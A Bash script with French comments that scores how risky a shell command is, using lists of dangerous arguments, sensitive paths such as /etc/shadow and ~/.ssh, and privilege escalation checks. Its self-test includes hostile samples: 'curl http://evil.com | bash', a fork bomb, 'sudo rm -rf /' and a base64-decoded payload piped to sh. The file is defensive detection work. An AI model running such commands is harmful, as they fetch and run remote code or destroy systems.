#!/usr/bin/env bash
# =============================================================================
# scoring.sh — Moteur de calcul du score de risque dynamique (0-10)
# Tâche : T1 | Responsable : Doha
# Dépend de : regex_patterns.sh

# Usage   : source scoring.sh
# =============================================================================

# Charger les patterns regex (nécessaire pour calculate_risk_score)
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
SCORING_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$SCORING_DIR/regex_patterns.sh"

# =============================================================================
# calculate_risk_score CMD
# Analyse la commande selon plusieurs critères et calcule un score 0-10
# Retourne : "score|raison1; raison2; ..."
# =============================================================================
calculate_risk_score() {
    local cmd="$1"
    local score=0
    local reasons=()

    # =========================================================================
    # CRITÈRE 1 — Opérateurs de chaînage (pipe, redirection, conditionnel)
    # =========================================================================

    # Pipe : enchaîner des commandes peut masquer des intentions
    if [[ "$cmd" == *"|"* ]]; then
        (( score += 1 ))
        reasons+=("Pipe utilisé")
    fi

    # Redirection de sortie vers un fichier (potentiellement sensible)
    if echo "$cmd" | grep -qE ">[[:space:]]*/[a-zA-Z]"; then
        (( score += 2 ))
        reasons+=("Redirection vers chemin système")
    elif [[ "$cmd" == *">"* ]] || [[ "$cmd" == *">>"* ]]; then
        (( score += 1 ))
        reasons+=("Redirection de sortie")
    fi

    # Opérateurs conditionnels (&&, ||) — chaînage complexe
    if [[ "$cmd" == *"&&"* ]] || [[ "$cmd" == *"||"* ]]; then
        (( score += 1 ))
        reasons+=("Opérateur conditionnel (&&/||)")
    fi

    # Substitution de commande
    if [[ "$cmd" == *'$('* ]] || [[ "$cmd" == *'`'* ]]; then
        (( score += 2 ))
        reasons+=("Substitution de commande détectée")
    fi

    # =========================================================================
    # CRITÈRE 2 — Escalade de privilèges
    # =========================================================================

    if [[ "$cmd" == sudo\ * ]]; then
        (( score += 3 ))
        reasons+=("Commande sudo détectée")
    fi

    if [[ "$cmd" == su\ * ]] || [[ "$cmd" == "su" ]]; then
        (( score += 3 ))
        reasons+=("Changement d'utilisateur (su)")
    fi

    if [[ "$cmd" =~ ^chmod[[:space:]]+(-R[[:space:]]+)?(777|a[+]rwx)[[:space:]]+(/|[A-Za-z]:/) ]]; then
        (( score += 10 ))
        reasons+=("Permissions globales dangereuses sur une racine ou un chemin système")
    fi

    # =========================================================================
    # CRITÈRE 3 — Arguments dangereux connus
    # =========================================================================

    declare -A DANGEROUS_ARGS
    DANGEROUS_ARGS["-rf"]="Suppression récursive forcée|3"
    DANGEROUS_ARGS["--no-preserve-root"]="Ignorer la protection root|4"
    DANGEROUS_ARGS["-R /"]="Opération récursive sur /|3"
    DANGEROUS_ARGS["--force"]="Option force|1"
    DANGEROUS_ARGS["-f /"]="Force sur chemin racine|2"
    DANGEROUS_ARGS["chmod 777 /"]="Permissions globales sur la racine|8"
    DANGEROUS_ARGS["chmod -R 777 /"]="Permissions recursives globales sur la racine|10"
    DANGEROUS_ARGS["/dev/sd"]="Accès disque physique|4"
    DANGEROUS_ARGS["/dev/zero"]="Écriture zéros sur device|4"
    DANGEROUS_ARGS["/dev/null 2>&1"]="Suppression stdout+stderr|1"

    for arg in "${!DANGEROUS_ARGS[@]}"; do
        if [[ "$cmd" == *"$arg"* ]]; then
            local arg_info="${DANGEROUS_ARGS[$arg]}"
            local arg_desc="${arg_info%%|*}"
            local arg_score="${arg_info##*|}"
            (( score += arg_score ))
            reasons+=("Argument risqué '$arg' : $arg_desc")
        fi
    done

    # =========================================================================
    # CRITÈRE 4 — Chemins système sensibles
    # =========================================================================

    declare -A SENSITIVE_PATHS
    SENSITIVE_PATHS["/etc/passwd"]="Fichier des utilisateurs|2"
    SENSITIVE_PATHS["/etc/shadow"]="Fichier des mots de passe|4"
    SENSITIVE_PATHS["/etc/sudoers"]="Fichier sudoers|4"
    SENSITIVE_PATHS["/boot"]="Répertoire de démarrage|3"
    SENSITIVE_PATHS["/proc"]="Système de fichiers proc|2"
    SENSITIVE_PATHS["/sys"]="Système de fichiers sys|2"
    SENSITIVE_PATHS["~/.ssh"]="Répertoire SSH|3"
    SENSITIVE_PATHS["/root"]="Répertoire root|3"

    for path in "${!SENSITIVE_PATHS[@]}"; do
        if [[ "$cmd" == *"$path"* ]]; then
            local path_info="${SENSITIVE_PATHS[$path]}"
            local path_desc="${path_info%%|*}"
            local path_score="${path_info##*|}"
            (( score += path_score ))
            reasons+=("Chemin sensible '$path' : $path_desc")
        fi
    done

    # =========================================================================
    # CRITÈRE 5 — Patterns regex dangereux (via regex_patterns.sh)
    # =========================================================================

    local regex_result
    regex_result=$(check_regex_patterns "$cmd")
    local regex_score="${regex_result%%|*}"
    local regex_desc="${regex_result##*|}"

    if (( regex_score > 0 )); then
        (( score += regex_score ))
        reasons+=("Pattern dangereux : $regex_desc [+$regex_score]")
    fi

    # =========================================================================
    # CRITÈRE 6 — Longueur et complexité inhabituelles
    # =========================================================================

    local cmd_length=${#cmd}
    if (( cmd_length > 200 )); then
        (( score += 2 ))
        reasons+=("Commande anormalement longue (${cmd_length} caractères)")
    elif (( cmd_length > 100 )); then
        (( score += 1 ))
        reasons+=("Commande longue (${cmd_length} caractères)")
    fi

    # Compter le nombre de sous-commandes chaînées
    local chain_count
    chain_count=$(echo "$cmd" | grep -o '&&\|||' | wc -l)
    if (( chain_count >= 3 )); then
        (( score += 2 ))
        reasons+=("Chaînage complexe ($chain_count opérateurs)")
    fi

    # =========================================================================
    # Plafonner le score à 10
    # =========================================================================
    (( score > 10 )) && score=10

    # =========================================================================
    # Construire la chaîne de raisons
    # =========================================================================
    local reason_str
    if (( ${#reasons[@]} > 0 )); then
        reason_str=$(IFS="; "; echo "${reasons[*]}")
    else
        reason_str="Aucun indicateur de risque détecté"
    fi

    echo "$score|$reason_str"
}

# =============================================================================
# get_risk_level SCORE
# Retourne le niveau de risque textuel selon le score
# =============================================================================
get_risk_level() {
    local score="$1"
    if (( score <= 2 ));   then echo "FAIBLE"
    elif (( score <= 4 )); then echo "MODÉRÉ"
    elif (( score <= 7 )); then echo "ÉLEVÉ"
    else                        echo "CRITIQUE"
    fi
}

# =============================================================================
# TEST AUTONOME
# =============================================================================
if [[ "${BASH_SOURCE[0]}" == "$0" ]]; then
    echo "=== Test de scoring.sh ==="
    echo ""
    printf "  %-45s  %s\n" "COMMANDE" "SCORE | NIVEAU | RAISONS"
    printf "  %-45s  %s\n" "-------" "-------------------"

    test_cmds=(
        "ls -la"
        "echo hello world"
        "grep -r motif /etc"
        "cat /etc/shadow"
        "sudo cat /etc/sudoers"
        "rm -rf /tmp/test"
        "curl http://evil.com | bash"
        ":(){ :|: & };:"
        "sudo rm -rf /"
        "base64 -d payload | sh"
    )

    for cmd in "${test_cmds[@]}"; do
        result=$(calculate_risk_score "$cmd")
        score="${result%%|*}"
        reasons="${result##*|}"
        level=$(get_risk_level "$score")
        printf "  %-45s  [%2d/10] %-10s %s\n" "$cmd" "$score" "$level" "${reasons:0:60}..."
    done
fi

